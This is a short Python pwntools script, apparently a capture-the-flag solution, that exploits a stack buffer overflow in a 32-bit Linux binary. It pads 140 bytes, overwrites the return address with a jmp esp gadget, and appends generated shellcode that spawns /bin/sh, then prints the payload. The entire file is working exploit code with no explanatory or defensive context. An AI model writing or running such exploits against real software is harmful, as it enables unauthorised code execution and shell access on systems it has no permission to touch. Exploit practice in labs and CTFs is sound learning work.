#!/usr/bin/env python

from pwn import *

offset = 140
jmpesp = p32(0x80485a7)

shellcode = asm(shellcraft.i386.linux.sh() , arch='x86', os='linux')

payload = cyclic(offset) + jmpesp + shellcode

print payload
